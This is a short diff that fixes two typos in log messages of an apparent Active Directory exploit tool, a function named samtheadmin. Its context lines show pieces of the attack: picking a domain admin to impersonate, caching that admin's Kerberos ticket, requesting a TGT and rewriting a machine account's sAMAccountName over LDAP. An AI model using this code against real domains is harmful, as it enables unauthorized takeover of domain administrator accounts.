@@ -166,7 +166,7 @@ def samtheadmin(username, password, domain, options):
         logging.info(f'Total Domain Admins {len(domainAdmins)}')
         domain_admin = random.choice(domainAdmins)
     
-    logging.info(f'will try to impersonat {domain_admin}')
+    logging.info(f'will try to impersonate {domain_admin}')
     adminticket = str(f'{domain_admin}_{dcfull}.ccache')
     if os.path.exists(adminticket):
         logging.info(f'Alreay have user {domain_admin} ticket for target {dcfull}')
@@ -217,7 +217,7 @@ def samtheadmin(username, password, domain, options):
     except Exception as e:
         logging.error(f"GetTGT error, error: {e}")
          # Restoring Old Values when get TGT error.
-        logging.info(f"Resting the machine account to {new_computer_name}")
+        logging.info(f"Reseting the machine account to {new_computer_name}")
         dn = get_user_info(dc_host, ldap_session, domain_dumper)
         ldap_session.modify(str(dn['dn']), {'sAMAccountName': [ldap3.MODIFY_REPLACE, [new_computer_name]]})
         if ldap_session.result['result'] == 0:
